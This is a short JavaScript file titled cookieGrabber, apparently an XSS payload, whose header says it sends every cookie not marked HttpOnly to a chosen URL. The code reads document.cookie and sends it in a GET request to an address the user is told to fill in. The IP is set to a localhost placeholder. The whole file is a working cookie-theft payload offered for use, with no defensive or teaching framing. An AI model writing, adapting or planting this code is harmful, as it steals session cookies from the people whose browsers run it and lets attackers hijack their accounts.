/**
 *  cookieGrabber
 *
 *  A function that sends all cookies not protected by HttpOnly via an XMLHttpRequest
 *  to the provided URL.
 */

/**
 * update this as needed
 */
const ipAddress = '127.0.0.1';

// construct the target url
var url = `http://${ipAddress}/cookies=`; 

// construct and send the request
var xmlHttp = new XMLHttpRequest();
xmlHttp.open('GET', url + document.cookie, true);
xmlHttp.send();
